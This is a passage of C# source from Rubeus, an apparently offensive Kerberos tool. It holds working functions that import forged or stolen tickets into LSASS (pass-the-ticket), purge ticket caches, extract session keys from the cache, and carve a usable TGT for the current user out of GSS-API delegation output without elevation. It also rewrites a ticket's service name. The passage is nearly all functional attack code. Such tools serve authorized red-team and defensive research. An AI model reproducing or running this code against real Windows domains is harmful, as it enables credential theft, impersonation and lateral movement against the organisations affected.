                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if ((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void Purge(LUID targetLuid)
        {
            // uses LsaCallAuthenticationPackage() with a message type of KERB_PURGE_TKT_CACHE_REQUEST to purge tickets
            //  for the current (or specified) logon session

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            var lsaHandle = GetLsaHandle();
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }

            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }

                var request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if ((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Tickets successfully purged!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        #endregion


        #region Misc Helpers

        public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
        {
            // gets the cached session key for a given service ticket
            //  used by RequestFakeDelegTicket()

            int authPack;
            IntPtr lsaHandle;
            int retCode;
            var name = "kerberos";
            byte[] returnedSessionKey;
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            var returnBufferLength = 0;
            var protocalStatus = 0;
            var responsePointer = IntPtr.Zero;
            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            // signal that we want encoded .kirbi's returned
            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
            request.EncryptionType = (int)etype;

            // target SPN to fake delegation for
            var tName = new Interop.UNICODE_STRING(target);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages

            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            var newStructSize = structSize + tName.MaximumLength;
            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            // marshal the struct from a managed object to an unmanaged block of memory.
            Marshal.StructureToPtr(request, unmanagedAddr, false);

            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            // copy unicode chars to the new location
            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            // update the target name buffer ptr            
            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);

            // actually get the data
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

            // translate the LSA error (if any) to a Windows error
            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
            {
                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                // extract the session key
                var sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                var sessionKeyLength = response.Ticket.SessionKey.Length;
                var sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);

                returnedSessionKey = sessionKey;
            }
            else
            {
                var errorMessage = new Win32Exception((int)winError).Message;
                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, target, errorMessage);
                returnedSessionKey = null;
            }

            // clean up
            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            return returnedSessionKey;
        }

        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)
        {
            // requests a ticket to 'cifs/dc.domain.com', which *should* be configured for unconstrained delegation
            //  the AP-REQ and associated forwarded TGT for the current user is carved out of GSS-API, so we get
            //  a usable TGT for the current user, without elevation

            byte[] finalTGTBytes = null;

            if (String.IsNullOrEmpty(targetSPN))
            {
                if (display)
                {
                    Console.WriteLine("[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'");
                }
                var domainController = Networking.GetDCName();
                if (String.IsNullOrEmpty(domainController))
                {
                    Console.WriteLine("[X] Error retrieving current domain controller");
                    return null;
                }
                targetSPN = String.Format("cifs/{0}", domainController);
            }

            var phCredential = new Interop.SECURITY_HANDLE();
            var ptsExpiry = new Interop.SECURITY_INTEGER();
            var SECPKG_CRED_OUTBOUND = 2;

            // first get a handle to the Kerberos package
            var status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);

            if (status == 0)
            {
                var ClientToken = new Interop.SecBufferDesc(12288);
                var ClientContext = new Interop.SECURITY_HANDLE(0);
                uint ClientContextAttributes = 0;
                var ClientLifeTime = new Interop.SECURITY_INTEGER(0);
                var SECURITY_NATIVE_DREP = 0x00000010;
                var SEC_E_OK = 0x00000000;
                var SEC_I_CONTINUE_NEEDED = 0x00090312;

                if (display)
                {
                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
                }

                // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
                var status2 = Interop.InitializeSecurityContext(ref phCredential,
                            IntPtr.Zero,
                            targetSPN, // null string pszTargetName,
                            (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),
                            0, //int Reserved1,
                            SECURITY_NATIVE_DREP, //int TargetDataRep
                            IntPtr.Zero,    //Always zero first time around...
                            0, //int Reserved2,
                            out ClientContext, //pHandle CtxtHandle = SecHandle
                            out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc
                            out ClientContextAttributes, //ref int pfContextAttr,
                            out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp

                if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
                {
                    if (display)
                    {
                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
                    }

                    if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                    {
                        if (display)
                        {
                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
                        }

                        // the fake delegate AP-REQ ticket is now in the cache!

                        // the Kerberos OID to search for in the output stream
                        //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
                        byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
                        var ClientTokenArray = ClientToken.GetSecBufferByteArray();
                        var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
                        if (index > 0)
                        {
                            var startIndex = index += KeberosV5.Length;

                            // check if the first two bytes == TOK_ID_KRB_AP_REQ
                            if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))
                            {
                                if (display)
                                {
                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
                                }

                                startIndex += 2;
                                var apReqArray = new byte[ClientTokenArray.Length - startIndex];
                                Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);

                                // decode the supplied bytes to an AsnElt object
                                //  false == ignore trailing garbage
                                var asn_AP_REQ = AsnElt.Decode(apReqArray, false);

                                foreach (var elt in asn_AP_REQ.Sub[0].Sub)
                                {
                                    if (elt.TagValue == 4)
                                    {
                                        // build the encrypted authenticator
                                        var encAuthenticator = new EncryptedData(elt.Sub[0]);
                                        var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                                        if (display)
                                        {
                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
                                        }

                                        // grab the service ticket session key from the local cache
                                        var key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);

                                        if (key != null)
                                        {
                                            var base64SessionKey = Convert.ToBase64String(key);
                                            if (display)
                                            {
                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
                                            }

                                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                                            var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);

                                            var asnAuthenticator = AsnElt.Decode(rawBytes, false);

                                            foreach (var elt2 in asnAuthenticator.Sub[0].Sub)
                                            {
                                                if (elt2.TagValue == 3)
                                                {
                                                    if (display)
                                                    {
                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");
                                                    }

                                                    var cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());

                                                    // check if cksumtype == GSS_CHECKSUM_TYPE
                                                    if (cksumtype == 0x8003)
                                                    {
                                                        var checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();

                                                        // check if the flags include GSS_C_DELEG_FLAG
                                                        if ((checksumBytes[20] & 1) == 1)
                                                        {
                                                            var dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                                            var krbCredBytes = new byte[dLen];
                                                            // copy out the krbCredBytes from the checksum structure
                                                            Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);

                                                            var asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);
                                                            Ticket ticket = null;
                                                            var cred = new KRB_CRED();

                                                            foreach (var elt3 in asn_KRB_CRED.Sub[0].Sub)
                                                            {
                                                                if (elt3.TagValue == 2)
                                                                {
                                                                    // extract the TGT and add it to the KRB-CRED
                                                                    ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);
                                                                    cred.tickets.Add(ticket);
                                                                }
                                                                else if (elt3.TagValue == 3)
                                                                {
                                                                    var enc_part = elt3.Sub[0].Sub[1].GetOctetString();

                                                                    // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
                                                                    var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);

                                                                    // decode the decrypted plaintext enc par and add it to our final cred object
                                                                    var encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
                                                                    cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));
                                                                }
                                                            }

                                                            var kirbiBytes = cred.Encode().Encode();
                                                            var kirbiString = Convert.ToBase64String(kirbiBytes);

                                                            if (display)
                                                            {
                                                                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                                                                if (Rubeus.Program.wrapTickets)
                                                                {
                                                                    // display the .kirbi base64, columns of 80 chararacters
                                                                    foreach (var line in Helpers.Split(kirbiString, 80))
                                                                    {
                                                                        Console.WriteLine("      {0}", line);
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    Console.WriteLine("      {0}", kirbiString);
                                                                }
                                                            }

                                                            finalTGTBytes = kirbiBytes;
                                                        }
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);
                    }
                }
                else
                {
                    Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);
                }
                // cleanup 1
                Interop.DeleteSecurityContext(ref ClientContext);
            }
            else
            {
                Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);
            }

            // cleanup 2
            Interop.FreeCredentialsHandle(ref phCredential);
            return finalTGTBytes;
        }

        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID())
        {
            // subtitutes in an alternate servicename (sname) into a supplied service ticket

            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);

            var name_string = new List<string>();
            var parts = altsname.Split('/');
            if (parts.Length == 1)
            {
                // sname alone
                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
            }
            else if (parts.Length == 2)
            {
                name_string.Add(parts[0]);
                name_string.Add(parts[1]);

                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
            }

            var kirbiBytes = kirbi.Encode().Encode();

            LSA.DisplayTicket(kirbi, 2, false, true);

            // TODO: check this code!

            //var kirbiString = Convert.ToBase64String(kirbiBytes);

            //Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

            //// display the .kirbi base64, columns of 80 chararacters
            //foreach (var line in Helpers.Split(kirbiString, 80))
            //{
            //    Console.WriteLine("      {0}", line);
            //}

            //DisplayTicket(kirbi, false);

            if (ptt || ((ulong)luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }
        }

        #endregion
    }
}
